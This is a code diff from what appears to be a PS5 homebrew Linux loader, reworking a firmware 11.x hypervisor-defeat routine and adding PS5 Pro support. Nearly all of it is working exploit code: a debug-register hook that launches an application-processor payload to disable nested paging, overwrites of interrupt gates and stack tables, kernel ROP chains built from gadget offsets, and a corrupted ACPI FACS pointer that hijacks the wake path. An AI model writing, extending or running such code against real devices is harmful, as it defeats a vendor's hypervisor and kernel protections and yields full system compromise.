@@ -1,4 +1,5 @@
 #include "hv_defeat_1160.h"
+
 #include "../shellcode_break_hv/break_hv.h"
 #include "../shellcode_break_hv/break_hv_params.h"
 #include "config.h"
@@ -13,24 +14,23 @@
 #include <unistd.h>
 
 /*
- * 11.60 resume chain:
+ * 11.x resume chain:
  *
  *   startup_mp DR0 hook -> AP payload at PA 0x3ffff000 -> disable NPT on all
  *   16 GameOS VMCBs -> stock wake path -> #GP/#SX ROP -> kernel wake blob.
  *
- * The DR0 carrier and the AP payload (shellcode_break_hv) are based on
- * Byepervisor. The #GP/#SX transfer is the same shape as 13.60: it copies the
- * wake blob from its prepare_resume() alias into the kernel code cave.
+ * The DR0 carrier and AP payload below come from the hardware-proven 11.60
+ * Byepervisor path.  The final #SX transfer preserves ps5-linux-loader's
+ * existing prepare_resume() alias and wake-shellcode contract.
  */
 
 #define FW_1100_RAW 0x11000043U
 #define FW_1120_RAW 0x11200005U
 #define FW_1140_RAW 0x11400005U
 #define FW_1160_RAW 0x11600005U
-#define PS5_PRO_SOC_ID 0x840fd0
 #define NCPU 16
 #define TSS_STRIDE 0x68ULL
-#define TSS_IST(ist) (0x24ULL + ((uint64_t)((ist) - 1) * 8ULL))
+#define TSS_IST(ist) (0x24ULL + ((uint64_t)((ist)-1) * 8ULL))
 
 #define KH_USER_CS 0x43ULL
 #define KH_USER_SS 0x3bULL
@@ -44,8 +44,19 @@
 #define RC_DR7 0xa0ULL
 
 #define AP_PAYLOAD_PAGE 0x3ffff000ULL
-#define AP_COPY_SIZE 0x800ULL
-#define HV_LOADER_PA_REGULAR 0x62800000ULL
+#define AP_COPY_SIZE 0xd00ULL
+#define HV_SCAN_LO_REGULAR (HV_BASE_REGULAR + 0x200000ULL)
+#define HV_SCAN_HI_REGULAR (HV_BASE_REGULAR + 0x1000000ULL)
+#define HV_SCAN_LO_PRO     (HV_REGION_BASE_PRO + 0xa00000ULL)
+#define HV_SCAN_HI_PRO     (HV_REGION_BASE_PRO + 0x1800000ULL)
+
+#define OFF_BOOT_METADATA_1160 0x3e10000ULL
+#define BOOT_METADATA_SIZE_1160 0x1000ULL
+#define BOOT_METADATA_MAX_RECORDS_1160 64
+#define EFI_MEMORY_MAP_RECORD_1160 0x9004U
+#define EFI_HV_MIN_SIZE_1160 0x1800000ULL
+#define EFI_HV_MAX_SIZE_1160 0x4000000ULL
+#define EFI_PHYS_LIMIT_1160 0x1000000000ULL
 
 #define CAVE_ORACLE_OFF 0x440ULL
 #define CAVE_ARM_OFF 0x1000ULL
@@ -54,13 +65,14 @@
 #define CAVE_FALLBACKS_OFF 0x1400ULL
 #define CAVE_HANDLER_OFF 0x2400ULL
 #define CAVE_AP_SOURCE_OFF 0x2800ULL
-#define CAVE_SAVE_OFF 0x3000ULL
-#define CAVE_STASH_OFF 0x3400ULL
+#define CAVE_SAVE_OFF 0x3500ULL
+#define CAVE_STASH_OFF 0x3600ULL
 
 #define IRET_OFF 0x20ULL
 #define FRAME_OFF 0x28ULL
 #define STACK_TOP_OFF 0x50ULL
 #define FALLBACK_SIZE 0x100ULL
+#define FALLBACK_COUNT (NCPU - 1)
 
 #define SAVE_STATE 0x00ULL
 #define SAVE_GATE_LO 0x08ULL
@@ -75,18 +87,110 @@
 
 _Static_assert(CAVE_ARM_OFF + 0x400 <= CAVE_FALLBACKS_OFF,
                "DR0 arm overlaps fallbacks");
-_Static_assert(CAVE_FALLBACKS_OFF + 15 * FALLBACK_SIZE <= CAVE_HANDLER_OFF,
+_Static_assert(IRET_OFF + sizeof(uint64_t) <= FRAME_OFF,
+               "fallback IRET target overlaps interrupt frame");
+_Static_assert(FRAME_OFF + 5 * sizeof(uint64_t) == STACK_TOP_OFF,
+               "fallback interrupt frame geometry changed");
+_Static_assert(STACK_TOP_OFF + 2 * sizeof(uint64_t) <= FALLBACK_SIZE,
+               "fallback pivot chain exceeds its private slot");
+_Static_assert(CAVE_FALLBACKS_OFF + FALLBACK_COUNT * FALLBACK_SIZE <=
+                   CAVE_HANDLER_OFF,
                "fallbacks overlap handler");
 _Static_assert(CAVE_HANDLER_OFF + 0x400 <= CAVE_AP_SOURCE_OFF,
                "handler overlaps AP source");
 _Static_assert(CAVE_AP_SOURCE_OFF + AP_COPY_SIZE <= CAVE_SAVE_OFF,
                "AP source overlaps recovery state");
+_Static_assert(CAVE_SAVE_OFF + SAVE_ISTS + NCPU * sizeof(uint64_t) <=
+                   CAVE_STASH_OFF,
+               "saved state overlaps AP result");
 _Static_assert(CAVE_STASH_OFF + 0x100 <= 0x4000,
                "result stash exceeds resume cave");
 _Static_assert(sizeof(break_hv_bin) <= AP_COPY_SIZE,
                "AP payload exceeds AP_COPY_SIZE");
 
 static uint64_t kg(uint64_t offset) { return ktext + offset; }
+
+/*
+ * The Pro HV aperture is far above the regular-model carveout.  Confirm the
+ * exact measured base and size from the bounded boot metadata before arming
+ * the wake carrier.  The regular path intentionally keeps its proven literal.
+ */
+static int validate_pro_hv_region_1160(void) {
+  uint64_t record = kg(OFF_BOOT_METADATA_1160);
+  const uint64_t metadata_end = record + BOOT_METADATA_SIZE_1160;
+  uint64_t candidate_base = 0, candidate_size = 0;
+  int candidates = 0, saw_end = 0;
+
+  for (int recno = 0; recno < BOOT_METADATA_MAX_RECORDS_1160; recno++) {
+    uint32_t header[2];
+    if (record > metadata_end - sizeof(header) ||
+        kernel_copyout(record, header, sizeof(header)) != 0)
+      return -1;
+
+    const uint32_t type = header[0], data_size = header[1];
+    if (type == 0 && data_size == 0) {
+      saw_end = 1;
+      break;
+    }
+    if (data_size > 0x10000U)
+      return -1;
+
+    const uint64_t advance = 8 + (((uint64_t)data_size + 7) & ~7ULL);
+    if (record > UINT64_MAX - advance || record + advance > metadata_end)
+      return -1;
+
+    if (recno == 0) {
+      char name[7];
+      if (type != 1 || data_size != sizeof(name) ||
+          kernel_copyout(record + 8, name, sizeof(name)) != 0 ||
+          memcmp(name, "kernel", sizeof(name)) != 0)
+        return -1;
+    }
+
+    if (type == EFI_MEMORY_MAP_RECORD_1160) {
+      uint64_t map_size, desc_size;
+      uint32_t version;
+      if (data_size < 0x20 ||
+          kernel_copyout(record + 8, &map_size, sizeof(map_size)) != 0 ||
+          kernel_copyout(record + 0x10, &desc_size, sizeof(desc_size)) != 0 ||
+          kernel_copyout(record + 0x18, &version, sizeof(version)) != 0)
+        return -1;
+      if (version != 1 || desc_size < 0x28 || desc_size > 0x80 ||
+          map_size == 0 || map_size > data_size - 0x20 ||
+          map_size % desc_size != 0)
+        return -1;
+
+      const uint64_t count = map_size / desc_size;
+      if (count > 128)
+        return -1;
+      for (uint64_t i = 0; i < count; i++) {
+        const uint64_t desc = record + 0x28 + i * desc_size;
+        uint32_t memory_type;
+        uint64_t base, pages;
+        if (kernel_copyout(desc, &memory_type, sizeof(memory_type)) != 0 ||
+            kernel_copyout(desc + 8, &base, sizeof(base)) != 0 ||
+            kernel_copyout(desc + 0x18, &pages, sizeof(pages)) != 0)
+          return -1;
+        if (memory_type == 0 && pages <= (UINT64_MAX >> 12) && base != 0 &&
+            base < EFI_PHYS_LIMIT_1160) {
+          const uint64_t size = pages << 12;
+          if (size >= EFI_HV_MIN_SIZE_1160 && size <= EFI_HV_MAX_SIZE_1160) {
+            candidates++;
+            candidate_base = base;
+            candidate_size = size;
+          }
+        }
+      }
+    }
+    record += advance;
+  }
+
+  return saw_end && candidates == 1 &&
+                 candidate_base == HV_REGION_BASE_PRO &&
+                 candidate_size == HV_REGION_SIZE_PRO
+             ? 0
+             : -1;
+}
 
 static int offsets_present(void) {
   const uint64_t required[] = {
@@ -132,7 +236,6 @@ static int offsets_present(void) {
   }
   if (kernel_get_fw_version() != expected_raw)
     return 0;
-  /* Every 11.x build shares the same hypervisor image and CC cave. */
   if (env_offset.HV_CODE_CAVE_PA != 0x62806F00ULL ||
       env_offset.HV_HANDLE_VMEXIT_PA != 0x62847551ULL)
     return 0;
@@ -155,7 +258,7 @@ static int pin_to_tss0(void) {
   if (cpuset_setaffinity(3, 3, set_id, 8, (const cpuset_t *)mask))
     return -1;
 
-  /* On 11.60, scheduler CPU 15 uses COMMON_TSS slot zero. */
+  /* Scheduler CPU 15 maps to COMMON_TSS slot zero on the proven 11.60 path. */
   mask[0] = 1ULL << 15;
   return cpuset_setaffinity(3, 1, -1, 0x10, (const cpuset_t *)mask);
 }
@@ -186,15 +289,67 @@ static int walk_page(uint64_t va, int clear_nx) {
   return -1;
 }
 
+static int resolve_kernel_pa_1160(uint64_t va, uint64_t *pa_out) {
+  uint64_t table = PAGE_PA(cr3);
+
+  if (pa_out == NULL || table == 0)
+    return -1;
+  for (int level = 0; level < 4; level++) {
+    const int shift = 39 - level * 9;
+    const uint64_t index = (va >> shift) & 0x1ffULL;
+    const uint64_t entry = kread64(dmap + table + index * 8);
+
+    if (!PAGE_P(entry))
+      return -1;
+    if (level == 1 && PAGE_PS(entry)) {
+      *pa_out = (entry & 0x000fffffc0000000ULL) |
+                (va & 0x3fffffffULL);
+      return 0;
+    }
+    if (level == 2 && PAGE_PS(entry)) {
+      *pa_out = (entry & 0x000fffffffe00000ULL) |
+                (va & 0x1fffffULL);
+      return 0;
+    }
+    if (level == 3) {
+      *pa_out = PAGE_PA(entry) | (va & 0xfffULL);
+      return 0;
+    }
+    table = PAGE_PA(entry);
+  }
+  return -1;
+}
+
+/*
+ * Walk the guest page tables only.  These frames belong to the hypervisor and
+ * NPT still protects them before the startup-AP strike, so reading them from
+ * the guest is fatal.  The AP payload reads them after it disables NPT.
+ */
+static int preflight_scan_range_1160(uint64_t scan_lo, uint64_t scan_hi) {
+  if (scan_lo >= scan_hi || (scan_lo & 0xfffULL) ||
+      (scan_hi & 0xfffULL))
+    return -1;
+  for (uint64_t pa = scan_lo; pa < scan_hi; pa += 0x1000ULL) {
+    uint64_t resolved;
+    const uint64_t va = dmap + pa;
+    if (resolve_kernel_pa_1160(va, &resolved) || resolved != pa)
+      return -1;
+  }
+  return 0;
+}
+
 static int validate_wake_cave(size_t shellcode_len) {
   if (shellcode_len == 0 || shellcode_len > CODE_CAVE_CAPACITY)
     return -1;
 
   /*
-   * Do not read 11.60 kernel text while NPT is still on: NPT enforces its
-   * execute-only mapping, so clearing the guest XO bit does not make it
-   * readable. [0xD2B000, 0xD30000) is NOP padding in the 11.60 kernel, so
-   * only check that every page of the cave is present and executable.
+   * Never dereference 11.60 kernel text before the startup-AP strike.  Its
+   * execute-only protection is enforced by NPT, so clearing the guest XO bit
+   * does not make a kernel_copyout safe.  The frozen 0xD30000 dump proves the
+   * complete [0xD2B000,0xD30000) tail is NOP-filled; this live gate therefore
+   * checks only that every destination page is still present and executable.
+   * The carrier likewise performs no pre-arm content read of its destination
+   * cave.
    */
   for (size_t off = 0; off < shellcode_len; off += 0x1000)
     if (walk_page(kg(env_offset.KERNEL_CODE_CAVE) + off, 0))
@@ -209,8 +364,8 @@ static uint64_t tss_ist_slot(uint64_t tss_base, int cpu, int ist) {
 static void gate_encode(uint64_t target, uint16_t selector, uint8_t ist,
                         uint64_t *lo, uint64_t *hi) {
   *lo = (target & 0xffffULL) | ((uint64_t)selector << 16) |
-        ((uint64_t)(ist & 7) << 32) | (KH_GATE_INTERRUPT << 40) | (1ULL << 47) |
-        (((target >> 16) & 0xffffULL) << 48);
+        ((uint64_t)(ist & 7) << 32) | (KH_GATE_INTERRUPT << 40) |
+        (1ULL << 47) | (((target >> 16) & 0xffffULL) << 48);
   *hi = (target >> 32) & 0xffffffffULL;
 }
 
@@ -223,10 +378,11 @@ static int verify_tss_layout(uint64_t tss_base, uint64_t saved[NCPU]) {
     rsp0[cpu] = kread64(base + 0x04);
     ist4[cpu] = kread64(base + TSS_IST(4));
     saved[cpu] = kread64(tss_ist_slot(tss_base, cpu, 6));
-    if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0 || saved[cpu] != 0)
+    if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0 ||
+        saved[cpu] != 0)
       return -1;
     for (int prior = 0; prior < cpu; prior++)
-      if (rsp0[cpu] == rsp0[prior] || ist4[cpu] == ist4[prior])
+      if (ist4[cpu] == ist4[prior])
         return -1;
   }
   return 0;
@@ -249,8 +405,8 @@ static int chain_q(uint8_t *buf, size_t *off, size_t cap, uint64_t value) {
   return 0;
 }
 
-static int chain_store(uint8_t *buf, size_t *off, size_t cap, uint64_t target,
-                       uint64_t value) {
+static int chain_store(uint8_t *buf, size_t *off, size_t cap,
+                       uint64_t target, uint64_t value) {
   return chain_q(buf, off, cap, kg(env_offset.GAD_POP_RDI_RET)) ||
          chain_q(buf, off, cap, target - 8) ||
          chain_q(buf, off, cap, kg(env_offset.GAD_POP_RCX_RET)) ||
@@ -258,14 +414,21 @@ static int chain_store(uint8_t *buf, size_t *off, size_t cap, uint64_t target,
          chain_q(buf, off, cap, kg(env_offset.GAD_STORE_RDI8_RCX_RET));
 }
 
-static int build_passthrough(uint8_t *stack, uint64_t stack_va) {
-  uint64_t trampoline = stack_va + IRET_OFF;
+static int build_bounded_iret(uint8_t *stack, uint64_t stack_va) {
+  uint64_t frame = stack_va + IRET_OFF;
+  uint64_t iret = kg(env_offset.GAD_IRETQ);
   size_t off = STACK_TOP_OFF;
 
   memset(stack, 0, FALLBACK_SIZE);
-  memcpy(stack + IRET_OFF, &(uint64_t){kg(env_offset.GAD_IRETQ)}, 8);
-  return chain_q(stack, &off, FALLBACK_SIZE, kg(env_offset.GAD_POP_RSP_RET)) ||
-         chain_q(stack, &off, FALLBACK_SIZE, trampoline);
+  /* The redirected gate is global, but only CPU 0 owns the carrier chain.
+   * A foreign-core #DB therefore gets its original five-qword frame back
+   * immediately.  Do not enter the stock handler on this tiny private slot:
+   * its call depth exceeds FALLBACK_SIZE and could corrupt an adjacent chain.
+   * This bounded IRET fallback is active only until CPU 0 restores the gate. */
+  memcpy(stack + IRET_OFF, &iret, sizeof(iret));
+  return chain_q(stack, &off, FALLBACK_SIZE,
+                 kg(env_offset.GAD_POP_RSP_RET)) ||
+         chain_q(stack, &off, FALLBACK_SIZE, frame);
 }
 
 static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
@@ -286,7 +449,8 @@ static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
   memcpy(arm + CAVE_ARM_CTX_OFF + RC_RSP, &(uint64_t){cont - 8}, 8);
   memcpy(arm + CAVE_ARM_CTX_OFF + RC_RIP,
          &(uint64_t){kg(env_offset.GAD_RET_TRAMP)}, 8);
-  memcpy(arm + CAVE_ARM_CTX_OFF + RC_DR7, &(uint64_t){KH_DR7_BP0_EXEC}, 8);
+  memcpy(arm + CAVE_ARM_CTX_OFF + RC_DR7,
+         &(uint64_t){KH_DR7_BP0_EXEC}, 8);
 
   off = CAVE_ARM_CONT_OFF;
   if (chain_q(arm, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)) ||
@@ -302,7 +466,8 @@ static int build_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
 
 static int build_handler(uint8_t *handler, uint64_t handler_va,
                          uint64_t resume_cave, uint64_t db_gate,
-                         uint64_t saved_gate_lo, uint64_t kernel_cr3) {
+                         uint64_t saved_gate_lo, uint64_t kernel_cr3,
+                         uint64_t scan_lo, uint64_t scan_hi) {
   uint64_t trampoline = handler_va + IRET_OFF;
   uint64_t payload_va = dmap + AP_PAYLOAD_PAGE;
   uint64_t oracle = resume_cave + CAVE_ORACLE_OFF;
@@ -337,18 +502,19 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
 
 #define STORE_PARAM(offset, value)                                             \
   do {                                                                         \
-    if (chain_store(handler, &off, 0x400, dmap + AP_PAYLOAD_PAGE + (offset),   \
-                    (value)))                                                  \
+    if (chain_store(handler, &off, 0x400,                                      \
+                    dmap + AP_PAYLOAD_PAGE + (offset), (value)))               \
       return -1;                                                               \
   } while (0)
   STORE_PARAM(0xf00, kg(env_offset.MP_STARTUP_INIT_VECTOR));
   STORE_PARAM(0xf08, dmap);
   STORE_PARAM(0xf10, oracle);
-  STORE_PARAM(0xf18, HV_LOADER_PA_REGULAR);
+  STORE_PARAM(0xf18, scan_lo);
   STORE_PARAM(0xf20, resume_cave + CAVE_STASH_OFF);
   STORE_PARAM(0xf28, payload_va);
   STORE_PARAM(0xf30, kernel_cr3);
   STORE_PARAM(0xf38, AP_MODE_1160);
+  STORE_PARAM(0xf40, scan_hi);
 #undef STORE_PARAM
 
   if (chain_q(handler, &off, 0x400, kg(env_offset.GAD_POP_RDI_RET)))
@@ -363,8 +529,9 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
       chain_q(handler, &off, 0x400, trampoline))
     return -1;
 
-  memcpy(handler + save_addr_off, &(uint64_t){handler_va + restore_rdi_off}, 8);
-  return 0;
+  memcpy(handler + save_addr_off, &(uint64_t){handler_va + restore_rdi_off},
+         8);
+  return off <= 0x400 ? 0 : -1;
 }
 
 __attribute__((noinline)) static void
@@ -408,7 +575,8 @@ resumed:
   return;
 }
 
-static int arm_startup_carrier(uint64_t resume_cave) {
+static int arm_startup_carrier(uint64_t resume_cave, uint64_t scan_lo,
+                               uint64_t scan_hi) {
   uint64_t tss_base = kg(env_offset.COMMON_TSS);
   uint64_t db_gate = kg(env_offset.IDT) + 16;
   uint64_t arm_va = resume_cave + CAVE_ARM_OFF;
@@ -416,15 +584,22 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   uint64_t hook_target = kg(env_offset.HV_MP_STARTUP_CALL);
   uint64_t saved_gate_lo = kread64(db_gate);
   uint64_t saved_gate_hi = kread64(db_gate + 8);
+  uint64_t stock_db_handler;
   uint64_t gate_lo, gate_hi;
   uint64_t saved_ist[NCPU];
   uint8_t arm[0x400], handler[0x400], fallback[FALLBACK_SIZE];
   uint8_t staged[AP_COPY_SIZE], verify[0x400];
 
   if (break_hv_bin_len == 0 || break_hv_bin_len > sizeof(staged) ||
+      scan_lo >= scan_hi || (scan_lo & 0xfffULL) || (scan_hi & 0xfffULL) ||
       kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != 0)
     return -1;
+  stock_db_handler = (saved_gate_lo & 0xffffULL) |
+                     (((saved_gate_lo >> 48) & 0xffffULL) << 16) |
+                     ((saved_gate_hi & 0xffffffffULL) << 32);
   if (!((saved_gate_lo >> 47) & 1) || ((saved_gate_lo >> 32) & 7) != 4 ||
+      stock_db_handler < ktext ||
+      stock_db_handler >= ktext + KTEXT_1160_END ||
       verify_tss_layout(tss_base, saved_ist))
     return -2;
 
@@ -436,17 +611,20 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   memset(staged, 0, sizeof(staged));
   memcpy(staged, break_hv_bin, break_hv_bin_len);
   kwrite(resume_cave + CAVE_AP_SOURCE_OFF, staged, sizeof(staged));
-  for (size_t checked = 0; checked < sizeof(staged);
-       checked += sizeof(verify)) {
-    kread(resume_cave + CAVE_AP_SOURCE_OFF + checked, verify, sizeof(verify));
-    if (memcmp(verify, staged + checked, sizeof(verify)) != 0)
+  for (size_t checked = 0; checked < sizeof(staged); checked += sizeof(verify)) {
+    size_t chunk = sizeof(staged) - checked;
+    if (chunk > sizeof(verify))
+      chunk = sizeof(verify);
+    memset(verify, 0, sizeof(verify));
+    kread(resume_cave + CAVE_AP_SOURCE_OFF + checked, verify, chunk);
+    if (memcmp(verify, staged + checked, chunk) != 0)
       return -4;
   }
 
   if (build_arm(arm, arm_va, hook_target, tss_ist_slot(tss_base, 0, 6),
                 handler_va + STACK_TOP_OFF) ||
       build_handler(handler, handler_va, resume_cave, db_gate, saved_gate_lo,
-                    cr3))
+                    cr3, scan_lo, scan_hi))
     return -5;
 
   kwrite(arm_va, arm, sizeof(arm));
@@ -459,9 +637,9 @@ static int arm_startup_carrier(uint64_t resume_cave) {
     return -6;
 
   for (int cpu = 1; cpu < NCPU; cpu++) {
-    uint64_t va =
-        resume_cave + CAVE_FALLBACKS_OFF + (uint64_t)(cpu - 1) * FALLBACK_SIZE;
-    if (build_passthrough(fallback, va))
+    uint64_t va = resume_cave + CAVE_FALLBACKS_OFF +
+                  (uint64_t)(cpu - 1) * FALLBACK_SIZE;
+    if (build_bounded_iret(fallback, va))
       return -7;
     kwrite(va, fallback, sizeof(fallback));
     kread(va, verify, sizeof(fallback));
@@ -474,6 +652,13 @@ static int arm_startup_carrier(uint64_t resume_cave) {
   for (int cpu = 0; cpu < NCPU; cpu++)
     kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_ISTS + (uint64_t)cpu * 8,
              saved_ist[cpu]);
+  if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_GATE_LO) != saved_gate_lo ||
+      kread64(resume_cave + CAVE_SAVE_OFF + SAVE_GATE_HI) != saved_gate_hi)
+    return -8;
+  for (int cpu = 0; cpu < NCPU; cpu++)
+    if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_ISTS +
+                (uint64_t)cpu * 8) != saved_ist[cpu])
+      return -8;
   kwrite64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE, STATE_ARMED);
   if (kread64(resume_cave + CAVE_SAVE_OFF + SAVE_STATE) != STATE_ARMED)
     return -8;
@@ -485,10 +670,11 @@ static int arm_startup_carrier(uint64_t resume_cave) {
     kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
   }
   for (int cpu = 0; cpu < NCPU; cpu++) {
-    uint64_t want = cpu == 0 ? arm_va + STACK_TOP_OFF
-                             : resume_cave + CAVE_FALLBACKS_OFF +
-                                   (uint64_t)(cpu - 1) * FALLBACK_SIZE +
-                                   STACK_TOP_OFF;
+    uint64_t want = cpu == 0
+                        ? arm_va + STACK_TOP_OFF
+                        : resume_cave + CAVE_FALLBACKS_OFF +
+                              (uint64_t)(cpu - 1) * FALLBACK_SIZE +
+                              STACK_TOP_OFF;
     if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want) {
       if (restore_ists(tss_base, saved_ist)) {
         notify("11.60 IST6 rollback readback failed; cold reboot required\n");
@@ -512,9 +698,9 @@ static int build_sx_rop(uint64_t ist, size_t shellcode_len) {
   uint64_t rop[16] = {0};
   uint64_t *p = rop;
 
-  /* The same transfer sequence as 13.xx. Its three UART debug writes use an
-   * OR [rcx],eax gadget that the 11.60 kernel does not have, so they are left
-   * out. */
+  /* The high-firmware transfer sequence. Its three UART breadcrumb
+   * writes use an accidental OR [rcx],eax gadget that does not exist in the
+   * 11.60 kernel; they are diagnostic-only and intentionally omitted. */
   *p++ = kg(env_offset.GAD_POP_RDI_RET);
   *p++ = kg(env_offset.KERNEL_CODE_CAVE);
   *p++ = kg(env_offset.GAD_POP_RSI_RET);
@@ -537,22 +723,39 @@ static void setidt(int vector, uint64_t handler, int ist) {
   gate.gd_dpl = SEL_KPL;
   gate.gd_p = 1;
   gate.gd_hioffset = handler >> 16;
-  kwrite(kg(env_offset.IDT) + (uint64_t)vector * sizeof(struct gate_descriptor),
+  kwrite(kg(env_offset.IDT) +
+             (uint64_t)vector * sizeof(struct gate_descriptor),
          &gate, sizeof(gate));
 }
 
 int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   uint64_t resume_cave, sx_ist, facs;
-  uint64_t zeroes[16] = {0};
+  uint64_t scan_lo = HV_SCAN_LO_REGULAR;
+  uint64_t scan_hi = HV_SCAN_HI_REGULAR;
+  uint64_t zeroes[30] = {0};
   int rc;
 
   if (shellcode_kernel == NULL || !offsets_present()) {
     notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
     return -1;
   }
-  if (sceKernelGetMainSocId() == PS5_PRO_SOC_ID) {
-    notify("11.60 AP payload refused on unvalidated PS5 Pro layout\n");
+  if (linux_i.kit_type != KIT_RETAIL &&
+      linux_i.kit_type != KIT_RETAIL_PRO) {
+    notify("11.x HV path refused: console variant is not a supported retail "
+           "model\n");
     return -1;
+  }
+  if (linux_i.kit_type == KIT_RETAIL_PRO) {
+    if (fw != 0x1160 || kernel_get_fw_version() != FW_1160_RAW) {
+      notify("PS5 Pro is supported only on retail 11.60 (0x11600005)\n");
+      return -1;
+    }
+    if (validate_pro_hv_region_1160()) {
+      notify("11.60 Pro HV metadata did not match; refusing to arm\n");
+      return -1;
+    }
+    scan_lo = HV_SCAN_LO_PRO;
+    scan_hi = HV_SCAN_HI_PRO;
   }
   if (validate_wake_cave(shellcode_kernel_len)) {
     notify("11.60 wake blob/cave mapping validation failed\n");
@@ -575,6 +778,10 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
     notify("11.60 startup-AP carrier page is not executable\n");
     return -1;
   }
+  if (preflight_scan_range_1160(scan_lo, scan_hi)) {
+    notify("11.60 VMCB scan-range mapping preflight failed\n");
+    return -1;
+  }
 
   /* The wake blob runs on this page while it copies Linux into the cave, so
    * staging took it and checked it, and the page under it, before it wrote
@@ -591,24 +798,22 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
   kwrite(resume_cave + CAVE_ORACLE_OFF, zeroes, sizeof(zeroes));
   kwrite(resume_cave + CAVE_STASH_OFF, zeroes, sizeof(zeroes));
 
-  rc = arm_startup_carrier(resume_cave);
+  rc = arm_startup_carrier(resume_cave, scan_lo, scan_hi);
   if (rc) {
     notify("11.60 startup-AP carrier refused to arm (%d)\n", rc);
     return -1;
   }
-
   kwrite64(kg(env_offset.COMMON_TSS) + TSS_IST(7), sx_ist + 0x1000);
-  /* #GP and #SX use a six-qword IST frame, so the final pivot
-   * (add rsp,0x28; pop rbp; ret) advances all 0x30 bytes before entering the
-   * ROP chain. The no-pop pivot above is only for the #DB startup carrier,
-   * which has no error code. */
+  /* #GP and #SX have a six-qword IST frame. The final
+   * pivot: add rsp,0x28 plus pop rbp advances all 0x30 bytes before ret enters
+   * the ROP chain.  The no-pop pivot above remains exclusive to the
+   * error-code-free #DB startup carrier. */
   setidt(13, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
   setidt(30, kg(env_offset.GAD_ADD_RSP_28_POP_RBP_RET), 7);
 
-  /* As on 13.60, corrupt the FACS pointer so the stock wake path reaches
+  /* Corrupt the FACS pointer so the stock wake path reaches
    * the #GP/#SX copy-and-transfer chain after NPT has been disabled. */
   kwrite64(kg(env_offset.ACPIGBL_FACS), kg(env_offset.ACPIGBL_FACS) - 8);
-
   notify("11.60 Linux wake chain armed\n");
   return 0;
 }
